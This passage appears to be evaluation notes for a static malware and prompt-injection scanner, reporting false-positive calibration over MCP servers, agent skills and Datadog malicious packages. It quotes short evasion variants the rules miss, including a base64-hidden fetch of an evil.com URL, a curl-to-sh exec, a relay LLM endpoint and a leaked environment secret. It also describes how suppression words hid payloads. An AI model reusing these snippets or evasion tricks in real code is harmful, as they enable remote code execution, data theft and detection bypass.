| Datadog ≥ Critical | DD_CRIT_A | DD_CRIT_B |

No verdict changed on any MCP server or skill. The one server that hit the
scan budget below HIGH in the fixed run (`com.appfigures/mcp`) was rescanned
with the budget off and stayed MEDIUM. OBFUSC-014 added a High to one
malicious skill (`cisco-ai-defense-skill-scanner-magic-string-trigger`, already
HIGH) and to DD_O14 Datadog samples; it fired on no clean MCP server or skill.

**Variants still not reported at High** (left as known gaps):

- A base64 literal shorter than 40 characters decoded into a network call
  (`urlopen(b64decode('aHR0cHM6Ly9ldmlsLmNvbS9j'))`) is now only OBFUSC-001
  Low. No decoded literal of 16–39 characters occurs in any of the three
  corpora, so the threshold has no measured cost or benefit either way.
- A JavaScript LLM client configured over several lines
  (`new OpenAI({` … `baseURL: 'https://relay.evil.dev/v1'`) is INFER-002 Low:
  INFER-001 needs the client and the URL on one line, and a bare `baseURL:`
  line cannot tell an LLM client from any HTTP client.
- `exec(['curl …', 'sh'].join('|'))` no longer fires CODE-002, which skips
  `exec([` as an argument list.
- INFER-004/005's `headers` word hides a secret-in-prompt that shares a line
  with a `headers` object (`{ headers, body: … `${process.env.SECRET_KEY}` }`).
- Zero-width characters between two non-ASCII letters no longer fire
  OBFUSC-CHAIN-006, so one inserted inside a CJK or Cyrillic injection
  phrase splits it silently. Not reverted: ZWSP between letters is correct
  Khmer and Thai (a Khmer strings file in a Datadog-bundled SDK has one).
- A `Function` literal with a hex-escaped body no longer fires CODE-008; the
  escapes still fire OBFUSC-006 High.

## Known gaps

- **In-sample.** Every change was written after reading these 169 servers, so
  22.5% is not a held-out false-positive rate. A second registry sample drawn
  after this pass (a different per-publisher offset, or the next snapshot's new
  servers) is the honest test.
- **Emoji ZWJ still fires OBFUSC-CHAIN-006 (High).** The rule's own
  remediation calls ZWJ inside an emoji sequence legitimate, and it is. It was
  left in because two malicious-labelled samples in the recall gates are held
  at High by nothing else: `mia-twitter-stealth` (a Twitter bot-evasion skill
  whose only finding is the ZWJ in its 🕵️‍♀️ emoji) and `buff-m-email-sender`
  (the ZWJ in `## 👨‍💻 作者`). Exempting emoji would take the skills gate to
  170/204 and the Datadog ≥ High count down by two, for an MCP gain of zero
  (no server in this corpus is blocked by an emoji alone). Neither sample has
  an attack shape a rule can see; their blocks are accidental.
- **`execSync` of a command string stays High (CODE-014).** It is what still
  blocks four servers (`XcodeBuildMCP`, `frase`, `firefox-devtools-mcp`,
  `next-devtools-mcp`), mostly on fixed commands in CLI helpers and build
  scripts (`execSync("claude --version")`, `execSync('npm run build')`) and a
  few interpolated ones (``execSync(`ps -o command= -p ${parentPid}`)``). It was
  not narrowed to interpolated commands: two Datadog samples' only High is a
  fixed command, `execSync('id > /tmp/rce_proof.txt')`, which is the attack.
- **Critical in a test file still gates CRITICAL.** `com.automox/automox-mcp`
  is CRITICAL RISK on injection strings its sanitizer's unit tests feed it.
  The verdict discounts tests/ and docs/ for HIGH but not for a standalone
  Critical; changing that is a scoring decision this pass did not take.
- **Comments.** PROMPT-003 on `com.aave/mcp` is a comment explaining the attack
  its sanitizer strips. Prompt-injection rules read comments on purpose (an
  agent reads them too), so this one is left.
- **Placeholder lists are lists.** CRED-006's `...` forms, the credential
  placeholders and the named code generators (ajv, depd, function-bind, zod,
  iconv, acorn) are recognised by text. A new generator or placeholder spelling
  will fire until it is added; an attacker who copies one of those strings onto
  the payload line hides that line from the one rule.
- **A suppression word covers its whole physical line.** `line_contains` is
  checked against the entire matched line, and a bundler puts a whole package
  on one line, so on minified code a benign word can sit megabytes from the
  match it suppresses. An audit of every word this pass added, on lines over
  4 KB in all three corpora, found three that hid findings in malicious
  Datadog samples; they were narrowed before the final build. NET-013's
  `::ffff:` hid the Shai-Hulud IMDS probe (`bun_environment.js`, `bundle.js`)
  in 128 samples, OBFUSC-006's `\x00\x01\x02\x03` hid the embedded-PE write
  in `aioconsol`'s setup.py, and CRED-007's `YOUR_` and `1234567890` hid a key
  literal on a `0xobelisk/sui-cli` source-map line. The added words that still
  match on long lines are the CODE-008/009 and SUPPLY-008 generator names
  inside library bundles (asyncapi, antv, protobufjs; none in a payload file
  of this dataset), INFER-004/005's `Bearer ` on two MCP servers, and one
  benign line each for CRED-008 and PERSIST-005 (PERSIST-005's word,
  `completion`, was later narrowed to completion-install commands by the
  verifier pass, as were the substring host words of INFER-001 and
  NET-CLEAR-001 and SUPPLY-002's `"version":`). The robust fix is in the
  engine (test the word within a window around the match), which is outside
  this pass.
- **OSV depends on the day.** Two servers are blocked by dependency advisories
  from the OSV lookup; the next advisory feed can add or remove blocks with no
  rule change.
- **Single-sample rules.** NET-CLEAR-001, NET-RCE-002, OBFUSC-013 and CRED-044
  were written for the recall they protect here (1, 1, 1 and 9 samples) and
  have no clean hits in any corpus measured, which with this few positives says
  little about their precision elsewhere.

## Third pass: lifecycle scripts and match-local suppression

The second pass left 39 of the 169 servers blocked. This pass removed the
blocks that came from a rule unable to see what a line does, where the
remaining evidence could be read without trusting anything a malicious
package could forge. It was planned by replaying candidate changes over
recorded scans (two designs, merged), then implemented in Rust and measured
with the built binary; every figure below is from the built binary.

```
Data Source: Real samples, scanned with the release build of this branch and,
             for "before", the release build of main (3982aa6); both with
             --no-cache and an isolated HOME.
             Clean MCP servers: the 169-server corpus described above
                    (in-sample: the changes were chosen after reading them).
             Skills: 204 malicious (Datadog ai-skills) and 455 vendor skills.
             Malicious packages: Datadog malicious-software-packages-dataset,
                    run_eval.py selection (--limit 204), 844 samples.
             SkillSpector parity: 1,796 de-duplicated findings constructed by
                    SkillSpector's own tests.
Sample Size: 169 MCP servers; 204 + 455 skills; 844 malicious packages;
             1,796 parity samples.
Limitations: In-sample for the MCP corpus. The held-out MCP sample was not
             scanned in this pass (it is reserved for the next one, and the
             planning replay had already been checked against it). "Clean"
             is not "audited". Static analysis only; the MCP and skills runs
             include the OSV lookup; the Datadog runs are offline (run_eval.py's
             six phases for the severity thresholds, and all nine phases named
             with --phases, which skips the network feeds, for the verdicts).
             The machine was shared (load average 3-14 during these runs); no
             run reported PROV-BUDGET-001, so no result was cut short by the
             per-file time budget.
```

### Results

| | Before (main) | After | Change |
|---|---:|---:|---:|
| MCP blocked (≥ HIGH) | 39/169 (23.1%) | 24/169 (14.2%) | −15 |
| MCP warned (≥ MEDIUM) | 125/169 (74.0%) | 75/169 (44.4%) | −50 |
| MCP CRITICAL | 17 | 11 | −6 |
| MCP servers whose verdict rose | | 0 | |
| Malicious skills blocked / warned | 173 / 184 of 204 | 173 / 184 | 0 |
| Clean skills blocked / warned | 7 / 71 of 455 | 7 / 71 | 0 |
| Skills whose verdict changed | | 0 of 659 | |
| SkillSpector parity, flagged / ≥ High | 623 / 385 of 1,796 | 623 / 385 | 0 |
| Parity samples whose result changed | | 0 | |
| Datadog verdict blocked / warned / CRITICAL (all nine phases) | 756 / 813 / 531 of 844 | 756 / 813 / 531 | 0 |
| Datadog six offline phases, ≥ any / Medium / High / Critical | 785 / 761 / 752 / 561 of 844 | 785 / 761 / 752 / 561 | 0 |
| Datadog samples whose verdict or highest severity changed | | 0 of 844 | |

63 servers moved down and none moved up. The 15 that left the blocked set:

- `com.microsoft/azure`, `com.microsoft/microsoft-fabric`,
  `com.microsoft/template-server-name`: CRITICAL → MEDIUM. The postinstall
  (`node ./scripts/post-install-script.js`) only checks `require.resolve` of
  the package's own platform build, so INSTALL-003 became INSTALL-010
  (Medium); the launcher's `execSync(`npm install ${platformPackageName}@${packageVersion}`)`
  installs the package's own `<name>-<platform>-<arch>` at its own version, so
  CODE-014 became CODE-016 (Medium); SKILL-006 no longer repeats INSTALL-003
  on `package.json`.
- `com.postman/postman-mcp-server`: CRITICAL → LOW. `npx only-allow pnpm` in
  both of its manifests is INSTALL-011 (Low).
- `ai.dimensions/analytics-mcp`: CRITICAL → MEDIUM. INFER-007 on
  `apiKey: "DIMENSIONS_DSL_API_KEY"` is a corroborating Critical; its
  NET-RCE-001 findings on printed install one-liners remain (see the correction
  in "Still blocked" above).
- `io.github.ChromeDevTools/chrome-devtools-mcp`: CRITICAL → MEDIUM. The
  function-arity wrapper in its bundled lighthouse code is exempt from
  OBFUSC-CHAIN-011. Its remaining High findings are all under
  `build/src/third_party/`, which the verdict treats as vendored code.
- `com.aave/mcp`, `io.frase/mcp-server`, `io.github.mozilla/firefox-devtools-mcp`,
  `io.github.cloudinary/asset-management-mcp`: HIGH → MEDIUM. Their
  `prepublishOnly` script is INSTALL-009 (Low, not an action), so their High
  findings no longer meet the action-corroborated HIGH bar; `cloudinary` also
  lost SUPPLY-008 to the bounded span.
- `io.qase/mcp-server`: HIGH → MEDIUM. `prepare: husky || true` is INSTALL-012,
  and `async exec(fn) {` is a method definition, not a CODE-002 call.
- `com.apideck/mcp`, `io.github.firebase/firebase-mcp`: HIGH → MEDIUM.
  CRED-008 no longer fires on `password: "password"` enum values or in `.d.ts`
  files; apideck's `prepublishOnly` is INSTALL-009 and its SUPPLY-008 match
  was two tokens a bundle apart.
- `com.audioeye/testing-sdk-mcp`: HIGH → MEDIUM. CODE-009 is a Low duplicate
  of the High CODE-008 on the same line, which halves that line's score.
- `com.tracklution/server-side-tracking`: HIGH → LOW. CRED-011 no longer
  fires on `bearer: 'data.laravel_auth_token'`, a field path.

The other 48 moved MEDIUM → LOW. Their Medium-or-above findings before (from
the recorded scans of main) were INSTALL-004 on a `prepublishOnly` or a
build-only `prepare` (37 servers), a shipped source map (HYGIENE-001, 19),
CRED-007 or CRED-008 on a name-shaped value (6), and one SUPPLY-011 span
across a bundle; several had more than one.

**Datadog at the rule level.** No Datadog sample's verdict or highest
severity moved, but 407 of the 844 lost at least one Medium-or-above
finding. Samples carrying each rule at that severity, main → this branch:

| Rule (severity on main) | Samples | Where the lost findings were |
|---|---:|---|
| SKILL-006 (High) | 276 → 0 | `package.json` lifecycle keys, which INSTALL-003/004 still report |
| HYGIENE-001 / -002 (Medium) | 197 → 0, 3 → 0 | Now Low |
| INFER-005 (High) | 105 → 3 | All 102 are versions of `@0xobelisk/sui-cli`: a backtick far before `process.env.*_KEY` on one minified line |
| INSTALL-004 (Medium) | 67 → 18 | 49 compromised libraries, now with 30 INSTALL-009 (`prepublishOnly`) and 24 INSTALL-012 (a `prepare` of `husky` or `npm run build` → `tsc`) findings between them. They include the `@ctrl/*` packages, whose `postinstall: node bundle.js` payload is still INSTALL-003 (Critical) |
| CODE-002 (High), CODE-003 (Medium), CODE-009 (High) | 148 → 141, 30 → 19, 14 → 0 | Method definitions in bundled code; `compile(` in JavaScript; CODE-009 is now Low |
| SUPPLY-007/008/011/013 (High), SUPPLY-016 (Critical) | 16 → 13, 12 → 7, 17 → 0, 3 → 0, 6 → 0 | Spans across bundled code: litellm's SUPPLY-016 matched across a tokenizer JSON, `@asyncapi/studio`'s across Next.js build chunks and a `.nft.json` file list |
| OBFUSC-CHAIN-009 (Medium) | 21 → 4 | Cyrillic prose followed by an ASCII URL, such as `aiogram-types-v3`'s Ukrainian `.po` translations |
| CRED-007 / 008 / 011 (High) | 17 → 15, 14 → 12, 3 → 1 | Name-shaped values in compromised libraries |

Every sample that lost one of the SUPPLY, CODE, CRED or INSTALL findings is
a compromised copy of a real library (the npm and PyPI `compromised_lib`
buckets); the table's third column is from reading the main build's findings
on the samples named, not on all 407. These rule-level losses are what
narrowing rules on clean code costs: a future sample whose only evidence is
one of these spans would now score lower.

### What changed

| Change | Rules | Why it is safe |
|---|---|---|
| Cache digest covers every finding-changing field | `CompiledCorpus::digest`, `ENGINE_REVISION` | It hashed only rule ids and regexes, so a severity or suppression change kept serving stale cached verdicts. Now severities, evidence, weights, filters, suppressions, provenance, correlation and engine-rule fields and an engine revision are hashed. |
| `prepublishOnly` split out | INSTALL-004 → `"(prepare\|prepublish)"\s*:`; new INSTALL-009 (Low, `publish_time_script`) | npm runs `prepublishOnly` on publish only. `INSTALL-REF-001` no longer links files only it runs, except through a lifecycle script that runs `npm run prepublishOnly`. |
| `compile(` in JavaScript | CODE-003 suppressed in JS-family files | JavaScript has no global `compile`; eval, Function and vm have their own rules. Python, markdown, notebooks and extensionless files stay covered. |
| `new Function` duplicate | CODE-009 → Low | Every CODE-009 line is also CODE-008 at High (checked over the fixtures and the detection docs). |
| Literal client key | INFER-007 → corroborate | Still Critical and still HIGH alone in a small package; CRITICAL needs a second corroborating Critical. |
| Lifecycle classifier | INSTALL-010/011/012, CODE-016 (`scanner/lifecycle.rs`) | Positive tests over the parsed manifest and the scripts it names; anything unproven keeps the pack's severity. See [structural-checks.md](structural-checks.md#lifecycle-scripts-and-platform-launchers-install-010--012-code-016). |
| Skill lifecycle keys | SKILL-006 no longer reads `package.json` | Duplicated INSTALL-003, which now reads the command. |
| Match-local suppression | `suppress.match_context`, `suppress.value_matches` (`corpus/exempt.rs`) | A line is dropped only when every match on it is exempt; overlap-safe; fails closed past 64 matches. |
| Definitions are not calls | CODE-001/002/003 | `def exec(`, `function eval(`, and in JS-family files a method `name(args) {`. |
| Names are not secrets | CRED-007/011 (lowercase-word values), CRED-008 (password field names, `.d.ts`) | JWTs, `sk_live_…`, `ghp_…`, `hunter2hunter2` still fire. |
| Arity wrapper | OBFUSC-CHAIN-011 | Exempt only when the joined array is the one the same line generated (`same: [gen, joined]`). |
| Bounded spans | SUPPLY-007/008/011/013/016, OBFUSC-CHAIN-009, INFER-004/005 | Tokens must be within 60-300 bytes; SUPPLY-001 and PROMPT-004 keep their unbounded spans (bounding them cost Datadog recall in the replay). The gate relaxes `{0,N}` to `*` so the counting regex only runs on lines with both tokens. |
| Source maps | HYGIENE-001/002 → Low | A shipped map exposes the publisher's source; it does not act on the installer. |

Each change has tests for the benign shape and for the attack variants it
could have dropped: `cli/src/scanner/lifecycle_tests.rs` (about ninety
postinstall, only-allow, launcher and prepare variants, each keeping its
original rule and severity), `cli/src/corpus/exempt_tests.rs` (overlap, mixed
lines, the match limit, UTF-8 windows, case, loader refusals) and
`cli/src/corpus/mcp_fp_tests.rs`.

### Still blocked (24)

- **Correct or defensible (10).** `ai.autoblocks/ctxl` (a shipped private
  key), `com.gitkraken/gk-cli` (`node install.js`, which downloads a
  binary), `io.github.SAP-samples/hana-cli` (a postinstall with filesystem
  access), `io.snyk/mcp` (`node wrapper_dist/bootstrap.js exec`),
  `io.github.mapbox/mcp-server` and `mcp-devkit-server` (`patch-package`),
  `io.slingdata/sling-cli` (setup.py `cmdclass`), `io.github.NVIDIA/elements`,
  `io.github.mongodb-js/mongodb-mcp-server`, `com.browser-use/browser-use`.
- **OSV advisories (2).** `io.github.awslabs/mcp-server-for-oscal`,
  `io.scrapfly.mcp/mcp`.
- **Need their own rule work (12).** `dev.svelte/mcp` and `ly.img/codesign`
  (SUPPLY-001 inside a bundled copy of a real package; SUPPLY-001 cannot be
  bounded or made corroborating without losing Datadog recall until the
  payload it protects has a rule of its own), `com.keboola/mcp`,
  `com.altmetric.mcp/altmetric-mcp`, `com.automox/automox-mcp`,
  `io.fusionauth/mcp-api`, `io.github.Azure/containerization-assist`,
  `io.github.localstack/localstack-mcp-server`,
  `io.github.dynatrace-oss/Dynatrace-mcp`, `dev.rivet/mcp`,
  `io.github.SAP/fiori-mcp-server`, `io.github.vercel/next-devtools-mcp`.

### Considered and not done

- SUPPLY-001 as corroborating: in the planning replay it cost 28 blocked and
  104 CRITICAL Datadog verdicts.
- Bounding PROMPT-004: in the planning replay it cost one Datadog verdict
  (HIGH → MEDIUM, a sample whose match spanned 19 KB of JSON) to unblock one
  held-out server. (Replay figures are from a Python replay over recorded
  scans, not from the built binary, and are not re-measured here.)
- README as human documentation, test paths never Critical, `.html` bundles,
  bundled-region markers, comment-only NET-RCE-001, `.eval(` as Medium,
  single-operand OBFUSC-004 as Low, the SKILL-012 licence exemption: each is
  forgeable or cheaply evaded (an agent reads the README; `require('./tests/x')`
  from `main`; a `//` line inside a template passed to a shell), or out of
  scope.

### Found in passing (separate work)

- `INSTALL-003` omits npm's `install` key, and a JSON-escaped key
  (`"postinstall"`) evades every lifecycle rule. Emitting findings from
  the parsed `scripts` object would close both; it needs its own
  false-positive measurement (`node-gyp rebuild`).
- A path that is an entry point should never count as secondary.
- `INSTALL-REF-001` would link a `chmod +x dist/x.js` argument as an executed
  file (not observed in these corpora).

## Reproducing

```bash
export CARGO_TARGET_DIR=/path/to/target CARGO_INCREMENTAL=0
(cd cli && cargo build --release)
export SIGIL_BIN=$CARGO_TARGET_DIR/release/sigil
# On a loaded machine, rescan any sample that reports PROV-BUDGET-001 below
# the threshold you count with SIGIL_FILE_BUDGET_SECS=0 (see Measurement notes).

# The clean MCP corpus, exactly as measured
python3 evaluation_results/corpora/fetch_mcp_clean.py \
    --out /data/mcp_clean \
    --from-manifest evaluation_results/corpora/mcp_clean_manifest.json

# MCP corpus (one unpacked package per directory)
python3 scripts/benchmark_skills.py --tools sigil \
    --clean /data/mcp_clean --clean-sample-depth 1 --workers 3 --out out/mcp

# SkillSpector on every 10th server
SKILLSPECTOR_BIN=/path/to/skillspector python3 scripts/benchmark_skills.py \
    --tools skillspector --clean /data/mcp_clean --clean-sample-depth 1 \
    --stride 10 --workers 1 --timeout 1200 --out out/mcp_ss

# Skills and Datadog: as in docs/detection/fp-calibration.md
# Datadog verdicts (third pass): each run_eval.py sample, extracted, scanned
# with every offline phase named so the network feeds do not run
$SIGIL_BIN scan <sample> --no-cache --format json --phases \
    install_hooks,code_patterns,network_exfil,credentials,obfuscation,provenance,prompt_injection,skill_security,inference_security
```
